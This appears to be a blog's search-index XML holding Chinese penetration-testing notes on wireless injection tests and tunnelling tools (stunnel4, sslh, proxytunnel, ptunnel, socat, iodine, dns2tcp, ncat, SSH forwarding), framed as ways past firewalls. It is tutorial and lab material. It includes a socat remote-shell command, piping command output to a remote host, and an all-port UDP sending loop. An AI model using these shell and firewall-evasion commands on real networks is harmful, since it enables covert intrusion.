<ul><li>回包率反应链路质量</li></ul></li><li>如果有两个无线网卡,可以检测具体可以注入哪种攻击</li><li>基本测试检测AP对probe广播的响应<ul><li>向每AP发30包</li><li>网卡成功发送并可接收包的能力</li></ul></li><li>基本测试<ul><li><code>aireplay -9 wlan2mon</code></li></ul></li><li>向隐藏AP/指定SSID注入<ul><li><code>aireplay-ng -9 -e leven -a EC:26:CA:FA:03:DC wlan2mon</code></li></ul></li><li>card to card 注入测试    #网卡到网卡<ul><li><code>aireplay-ng -9 -i wlan0mon wlan2mon</code></li><li>具体攻击方式</li><li>-i 作为AP的网卡</li><li>5/7 Faild<ul><li>注入MAC和真实MAC</li><li>相同时可以正常使用</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
            <tag> 无线抓包 </tag>
            
            <tag> 无线破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stunnel4基于SSL加密的隧道工具</title>
      <link href="/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
      <url>/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="stunnel4"><a href="#stunnel4" class="headerlink" title="stunnel4"></a><strong>stunnel4</strong></h3></blockquote><ul><li>无需修改源代码的情况下将TCP流量封装于SSL通道内</li><li>适用于本身不支持加密传输的应用</li><li>支持openssl安全特性</li><li>跨平台</li><li>性能优,多并发</li></ul><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a><strong>环境部署</strong></h4><h5 id="安装内网stunnel4服务器"><a href="#安装内网stunnel4服务器" class="headerlink" title="安装内网stunnel4服务器"></a><strong>安装内网stunnel4服务器</strong></h5><ul><li><p>服务器端配置</p></li><li><p>Linux生成根证书:</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new –days 365 -nodes -x509 -out &#x2F;etc&#x2F;stunnel&#x2F; stunnel.pem -keyout &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br></pre></td></tr></table></figure><ul><li>创建配置文件:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;stunnel&#x2F;stunnel.conf</span><br><span class="line">cert &#x3D; &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br><span class="line">setuid &#x3D; stunnel4</span><br><span class="line">setgid &#x3D; stunnel4</span><br><span class="line">pid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid</span><br><span class="line">[mysqls]</span><br><span class="line">accept  &#x3D; 0.0.0.0:443</span><br><span class="line">connect &#x3D; 1.1.1.11:3306</span><br></pre></td></tr></table></figure><p><strong>stunnel4自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动stunnel4服务</strong></p><pre><code>service stunnel4 start</code></pre><p><strong>防火墙规则</strong></p><ul><li>端口映射TCP/443端口到stunnel4服务端TCP/443</li><li>设置防火墙规则</li></ul><h5 id="Stunnel4客户端"><a href="#Stunnel4客户端" class="headerlink" title="Stunnel4客户端"></a><strong>Stunnel4客户端</strong></h5><p><strong>安装stunnel4客户端</strong></p><ul><li>kaLi自带</li></ul><p><strong>客户端配置</strong></p><pre><code>创建配置文件    vi /etc/stunnel/stunnel.conf    client = yes    [mysqls]    accept = 3306    connect = 192.168.1.11:443</code></pre><p><strong>客户端自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动客户端服务</strong></p><pre><code>service stunnel4 stop /start</code></pre><p><strong>Mysql客户端连接服务器</strong></p><pre><code>mysql -u root -h 127.0.0.1</code></pre><ul><li>抓包对比隧道前后差异</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stunnel4 </tag>
            
            <tag> kaLi </tag>
            
            <tag> openssl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sslh端口转发分配器</title>
      <link href="/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/"/>
      <url>/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="sslh"><a href="#sslh" class="headerlink" title="sslh"></a><strong>sslh</strong></h3></blockquote><h4 id="端口分配器"><a href="#端口分配器" class="headerlink" title="端口分配器"></a><strong>端口分配器</strong></h4><ul><li>根据客户端第一个包检测协议类型</li><li>根据协议检测结果将流量转发给不同目标</li><li>支持HTTP,HTTPS,SSH,OpenVPN,tinc,XMPP和其它可基于正则表达式判断的人和协议类型</li><li>适用于防火墙允许443端口 <strong>入站</strong> 访问流量的环境</li></ul><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h5><pre><code>vi /etc/default/sslh    RUN=yes    DAEMON_OPTS=&quot;--user sslh --listen 1.1.1.10:443 --ssh 127.0.0.1:22 --ssl 1.1.1.11:443 --http 127.0.0.1:80 --pidfile /var/run/sslh/sslh.pid&quot;</code></pre><h5 id="安装HTTPS站点"><a href="#安装HTTPS站点" class="headerlink" title="安装HTTPS站点"></a><strong>安装HTTPS站点</strong></h5><ul><li>安装IIS服务,证书服务</li><li>部署HTTPS站点</li></ul><h5 id="启动本地HTTP服务"><a href="#启动本地HTTP服务" class="headerlink" title="启动本地HTTP服务"></a><strong>启动本地HTTP服务</strong></h5><h5 id="防火墙端口映射TCP-443"><a href="#防火墙端口映射TCP-443" class="headerlink" title="防火墙端口映射TCP/443"></a><strong>防火墙端口映射TCP/443</strong></h5><h5 id="nmap扫描服务识别"><a href="#nmap扫描服务识别" class="headerlink" title="nmap扫描服务识别"></a><strong>nmap扫描服务识别</strong></h5><pre><code>nmap -p443 -sV -A 192.168.1.11</code></pre><p><em>扫描结果验证:443端口识别为多个服务</em></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
            <tag> 端口转发 </tag>
            
            <tag> sslh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP代理隧道工具-proxytunnel</title>
      <link href="/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/"/>
      <url>/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a><strong>proxytunnel</strong></h3></blockquote><ul><li>通过标准的HTTP/HTTPS代理创建隧道的工具</li><li>通过HTTP Connect 方法封装信息</li><li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li><li>无法创建DNS隧道和ICMP隧道</li></ul><h4 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a><strong>Lab1</strong></h4><h5 id="将外网资源映射为内网指定端口"><a href="#将外网资源映射为内网指定端口" class="headerlink" title="将外网资源映射为内网指定端口"></a><strong>将外网资源映射为内网指定端口</strong></h5><ul><li>内网安装squid3代理,proxytunnel<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;squid3&#x2F;squid.conf</span><br><span class="line">&#x2F;^http_port</span><br><span class="line">&#x2F;^http_access#改allow</span><br><span class="line">&#x2F;^acl</span><br></pre></td></tr></table></figure></li></ul><p>创建隧道:</p><pre><code>proxytunnel -a 80 -p 127.0.0.1:3128 -d 192.168.1.1:80</code></pre><h4 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a><strong>Lab2</strong></h4><h5 id="外网资源非防火墙允许端口"><a href="#外网资源非防火墙允许端口" class="headerlink" title="外网资源非防火墙允许端口"></a><strong>外网资源非防火墙允许端口</strong></h5><ul><li>修改目标资源侦听端口可能无法躲避防火墙深层检测</li><li>外网安装squid3代理服务器并侦听80端口</li><li>创建隧道:<pre><code>proxytunnle -a 80 -p 127.0.0.1:3128 -r 192.168.1.1:80 -d 192.168.1.1:22</code></pre></li></ul><h4 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a><strong>Lab3</strong></h4><h5 id="ssh客户端配置自动创建代理链隧道"><a href="#ssh客户端配置自动创建代理链隧道" class="headerlink" title="ssh客户端配置自动创建代理链隧道"></a><strong>ssh客户端配置自动创建代理链隧道</strong></h5><pre><code>vi ~/.ssh/configHost 192.168.1.1    Hostname 192.168.1.1    ProtocolKeepAlives 30    ProxyCommand /usr/bin/proxytunnel -p 1.1.1.1:3128 -r 192.168.1.1:80 -d %h:%p</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> squid3 </tag>
            
            <tag> proxytunnel </tag>
            
            <tag> HTTP隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ptunnel基于ICMP协议的隧道工具</title>
      <link href="/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
      <url>/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a><strong>ptunnel</strong></h3><p>Ping tunnel ICMP隧道工具</p></blockquote><ul><li>通过ICMP echo(ping requests)和reply(ping reply)实现隧道</li><li>适用于防火墙只允许ping出站流量的环境</li><li>支持多并发连接,性能优</li><li>支持身份验证</li><li>需要root权限</li><li>支持抓包<br>  Win:winpacap<br>  Linux:libpcap</li><li>工作过程<br>  Proxy,Client,Destination</li></ul><p><strong>Server</strong></p><pre><code>ptunnel -x 1234</code></pre><p><strong>Client</strong></p><pre><code>sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234</code></pre><h4 id="嵌套SSH隧道"><a href="#嵌套SSH隧道" class="headerlink" title="嵌套SSH隧道"></a><strong>嵌套SSH隧道</strong></h4><pre><code>ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></pre><ul><li>ptunnel 直到目前的最新版本仍存在拒绝服务漏洞-0.72</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隧道嵌套 </tag>
            
            <tag> ptunnel </tag>
            
            <tag> ICMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>socat数据流通道工具做端口转发</title>
      <link href="/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a><strong>SOCAT</strong></h3></blockquote><ul><li>被称为nc++ (增强增强版的nc)<br>  双向数据流通道工具</li></ul><p><strong>连接端口</strong></p><pre><code>socat - tcp:1.1.1.1:80</code></pre><p><strong>侦听端口</strong></p><pre><code>socat - tcp4-listen:22        /    socat - tcp-l:333</code></pre><p><strong>接收文件</strong></p><pre><code>socat tcp4-listen:333 open:2.txt,creat,append</code></pre><p><strong>发送文件</strong></p><pre><code>cat 1.txt | socat - tcp4:1.1.1.1:333</code></pre><h4 id="远程shell-–服务器端"><a href="#远程shell-–服务器端" class="headerlink" title="远程shell –服务器端"></a><strong>远程shell</strong> –服务器端</h4><pre><code>Server: socat tcp-l:23 exec:sh,pty,stderrClient: socat - tcp:1.1.1.1:23</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a><strong>端口转发</strong></h4><pre><code>socat tcp4-listen:8080,fork tcp4:192.168.254.254:80</code></pre><h4 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a><strong>远程执行命令</strong></h4><pre><code>Server: socat - udp-l:2001Client: echo &quot;`id`&quot; | socat - udp4-datagram:1.1.1.1:2001</code></pre><h4 id="UDP-全端口任意内容发包"><a href="#UDP-全端口任意内容发包" class="headerlink" title="UDP 全端口任意内容发包"></a><strong>UDP 全端口任意内容发包</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PORT in &#123;1..65535&#125;; do echo &quot;aaaaa&quot; | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done</span><br></pre></td></tr></table></figure><h4 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a><strong>二进制编辑器</strong></h4><pre><code>echo -e &quot;\0\14\0\0\c&quot; | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420</code></pre><h4 id="简单的web服务器"><a href="#简单的web服务器" class="headerlink" title="简单的web服务器"></a><strong>简单的web服务器</strong></h4><pre><code>socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> 端口转发 </tag>
            
            <tag> socat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS协议隧道iodine及ncat</title>
      <link href="/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/"/>
      <url>/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="iodine-碘"><a href="#iodine-碘" class="headerlink" title="iodine    #碘"></a><strong>iodine</strong>    #碘</h3><p>基于DNS查询的隧道工具<br>与同类工具相比的优点</p></blockquote><ul><li>对下行数据不进行编码,因此性能优</li><li>支持多平台:Linux,BSD,Mac OS,Windows</li><li>最大16个并发连接</li><li>强制密码支持</li><li>支持同网段隧道IP(不同于服务器,客户端网段)</li><li>支持多种DNS纪录类型</li><li>丰富的隧道质量检测措施</li></ul><p><strong>运行服务器端</strong></p><pre><code>iodined -f -c 10.0.0.1 test.lab.com-f :    前端显示(可选)-c :    不检查客户端IP地址IP :    服务器端的隧道IP地址</code></pre><p><strong>运行客户端</strong></p><pre><code>iodine -f test.lab.comcurl --socks5-hostname 127.0.0.1:7001 http://www.sina.com</code></pre><p><strong>隧道网络接口</strong></p><ul><li>不基于资源的通用隧道,如同本网段内两台相邻的主机</li><li>服务器和客户端分别生成隧道网络接口dns0</li><li>隧道两端接口的IP地址应不同于客户端和服务器网段</li><li>基于此隧道可嵌套其它隧道技术<br>  <code>ssh -CfNg -D 7001 root@10.0.0.1</code></li></ul><p><strong>iodine for Windows</strong><br>安装TAP网卡驱动<br><code>https://openvpn.net/index.php/open-source/downloads.html</code><br>只安装TAP Virtual Ethernet Adapter和所有依赖包<br>Windows客户端</p><pre><code>http://code.kryo.se/iodine/iodine -f test.lab.com建立SSH隧道</code></pre><blockquote><h3 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h3></blockquote><ul><li>被称为众多NC衍生版软件中最优的选择,不是一个单独的软件,包含在nmap套件中</li></ul><p><strong>代理功能</strong></p><pre><code>ncat -l 8080 --proxy-type http --proxy-auth user:pass</code></pre><p><strong>Broker中介代理功能</strong> #类似于早于交换机的hub功能</p><ul><li>AB不通但AC,BC互通</li><li>服务器: <code>ncat -l 333 --broker</code></li><li>客户端之间发送任何信息都会被hub到其他客户端</li><li>批量执行命令: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 1.1.1.1 --sh-exec &quot;echo &#96;pwd&#96;&quot;</span><br></pre></td></tr></table></figure></li><li>批量传文件: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --send-only 1.1.1.1 &lt; inputfile</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> http代理 </tag>
            
            <tag> DNS隧道 </tag>
            
            <tag> 隧道嵌套 </tag>
            
            <tag> ncat </tag>
            
            <tag> iodine </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS协议隧道-dns2tcp</title>
      <link href="/2015/07/05/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93-dns2tcp/"/>
      <url>/2015/07/05/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93-dns2tcp/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="DNS协议隧道"><a href="#DNS协议隧道" class="headerlink" title="DNS协议隧道"></a>DNS协议隧道</h3><p><strong>防火墙禁止TCP出站访问流量</strong></p></blockquote><ul><li>SSH隧道,端口转发全部失效</li><li>使用基于UDP协议的隧道</li><li>DNS的工作原理适合用于实现隧道</li></ul><p><strong>DNS工作原理</strong></p><ul><li>DNS隧道原理:注册受自己控制的DNS纪录</li></ul><h4 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a><strong>dns2tcp</strong></h4><ul><li>利用合法DNS服务器实现DNS隧道</li><li>C/S(dns2tcpc / dns2tcpd)结构</li><li>通过TXT纪录加密传输数据(A纪录长度有限)</li><li>隧道建立后保持连接</li><li>默认纪录生存时间值为3秒</li></ul><p><strong>dns2tcp的作用</strong></p><ul><li>把TCP流量封装到DNS协议里面,通过DNS隧道来进行信息传递,通过这种方法可以绕过防火墙对内网的限制</li></ul><p><strong>安装</strong></p><pre><code>apt-get install dns2tcpKali默认安装</code></pre><p><strong>服务端配置文件</strong></p><pre><code>/etc/dns2tcpd.conf.dns2tcpd资源可以是其它网址</code></pre><p><strong>启动</strong></p><pre><code>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf-F:        #前端运行-d:    ғdebug level 1-3-f: 指定配置文件</code></pre><blockquote><p>测试环境1:</p></blockquote><ul><li>Windows 03: 安装DNS服务;配置转发器;创建区域lab.com;指派二级域test.lab.com;NS纪录指向Kali</li><li>WAF: 只允许出站 UDP 53端口流量</li><li>Bodhi: 安装dns2tcp,wireshark,firefox<br>  <code>dns2tcpc -c -k pass -d 1 -l 2222 -r ssh -z test.lab.com</code></li></ul><p><strong>资源访问</strong></p><ul><li>本地SSH资源</li><li>远程http资源</li><li>http代理(squid)<br>  <code>apt-get install squid3</code></li><li>https代理</li><li>隧道嵌套<br>  基于SSH资源将SSH动态端口转发隧道嵌套于DNS隧道中<br>  <code>ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code><br>  XP IE,Firefox使用嵌套的Socks代理上网</li><li>抓包分析DNS隧道通信</li></ul><blockquote><p>测试环境2:</p></blockquote><ul><li>FW限制只允许内网DNS服务器访问外网指定DNS服务器UDP 53端口</li><li>内网DNS服务器:安装DNS服务,配置转发器到外网DNS服务器</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dns2tcp </tag>
            
            <tag> squid3 </tag>
            
            <tag> http代理 </tag>
            
            <tag> DNS隧道 </tag>
            
            <tag> 隧道嵌套 </tag>
            
            <tag> Bodhi </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH远程端口转发和动态端口转发以及X协议转发</title>
      <link href="/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/"/>
      <url>/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a><strong>SSH远程端口转发</strong></h3><p>由于ACL等原因,SSH与应用连接建立方向相反</p></blockquote><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4><ul><li>SSH客户端+应用客户端位于FW一端</li><li>SSH服务端+应用服务端位于另一端</li></ul><h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4><ul><li><p>SSH客户端,应用客户端位于FW两端</p></li><li><p>SSH服务端,应用服务端位于FW两端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;</span><br><span class="line">ssh -CfNg -R 7001:1.1.1.11:80 root@192.168.254.118 -p 53#WEB应用端口转发</span><br><span class="line">ssh -CfNg -R 7002:1.1.1.11:3389 root@192.168.254.118 -p 53#RDP应用端口转发</span><br><span class="line">ssh -CfNg -R 7003:1.1.1.11:3333 root@192.168.254.118 -p 53#NC应用端口转发</span><br></pre></td></tr></table></figure></li><li><p>之所以称为远程,是因为SSH侦听端口开在远程的SSH Server上</p></li><li><p>侦听端口永远开在应用客户端一方</p></li><li><p>WEB,RDP,NC应用端口转发测试</p></li></ul><blockquote><h3 id="SSH-动态端口转发"><a href="#SSH-动态端口转发" class="headerlink" title="SSH 动态端口转发"></a><strong>SSH 动态端口转发</strong></h3></blockquote><p><strong>本地,远程端口转发都需要固定应用服务器IP,Port</strong></p><ul><li>应用端口繁多,逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探</li></ul><p><strong>本地侦听socks4/5代理端口</strong></p><ul><li>由SSH server决定如何转发</li><li>作为翻墙代理使用</li><li>配置客户端代理(浏览器)</li><li>使用 <strong>proxychains</strong> 支持无代理客户端<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7001 root@1.1.1.1 -p 2121</span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="X-协议转发"><a href="#X-协议转发" class="headerlink" title="X 协议转发"></a><strong>X 协议转发</strong></h3></blockquote><ul><li>远程登录Linux GUI运行图形化界面工具<br>  VNC<br>  X Windows</li><li>防火墙限制访问时<br>  基于SSH的X转发<br>  <code>ssh -X user@1.1.1.1 -p 53</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 流量操控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> 端口转发 </tag>
            
            <tag> SSH </tag>
            
            <tag> VNC </tag>
            
            <tag> proxychains </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH隧道和SSH本地端口转发</title>
      <link href="/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a><strong>SSH 隧道</strong></h3></blockquote><h4 id="SSH支持双向通信隧道技术"><a href="#SSH支持双向通信隧道技术" class="headerlink" title="SSH支持双向通信隧道技术"></a><strong>SSH支持双向通信隧道技术</strong></h4><ul><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a><strong>SSH 本地端口转发</strong></h4></li><li>使效果类似于Rinetd</li><li>将一本地端口与远程服务器建立隧道<h4 id="建立双向安全隧道"><a href="#建立双向安全隧道" class="headerlink" title="建立双向安全隧道"></a><strong>建立双向安全隧道</strong></h4></li><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4></li><li>本机侦听端口,访问转发到远程主机指定端口<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4></li><li>远程侦听端口,访问转发到本机主机指定端口<h4 id="动态隧道模式"><a href="#动态隧道模式" class="headerlink" title="动态隧道模式"></a><strong>动态隧道模式</strong></h4></li><li>动态端口转发</li></ul><blockquote><h4 id="将本地端口与远程服务器建立隧道"><a href="#将本地端口与远程服务器建立隧道" class="headerlink" title="将本地端口与远程服务器建立隧道"></a><strong>将本地端口与远程服务器建立隧道</strong></h4></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Kali默认不允许Root登录,修改以下配置</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PermitRootLogin prohibit-password#注释此项</span><br><span class="line">PermitRootLogin yes#add此项</span><br><span class="line">Port 53#更改默认端口</span><br><span class="line">PasswordAuthentication yes#取消注释此项</span><br><span class="line"></span><br><span class="line">service ssh start#Kali默认不启动SSH服务,启动SSH</span><br><span class="line">service ssh restart#修改配置后重启SSH服务</span><br><span class="line"></span><br><span class="line">本地端口转发:</span><br><span class="line">ssh -fCNg -L &lt;local listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt; #本地端口转发侦听</span><br><span class="line">ssh -L 7001:192.168.1.124:80 root@192.168.1.110 -p 53</span><br><span class="line"></span><br><span class="line">ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt; </span><br><span class="line"></span><br><span class="line">-f#后台运行进程</span><br><span class="line">-N#不执行登录shell</span><br><span class="line">-g#复用访问时作为网关,支持多主机访问本地侦听端口</span><br></pre></td></tr></table></figure><ul><li>网关模式转发RDP,NC shell</li><li>端口转发基于建立起来的SSH隧道,隧道中断则端口转发中断</li><li>只能在建立隧道时创建转发,不能为已有隧道增加端口转发</li></ul>]]></content>
      
      
      <categories>
          
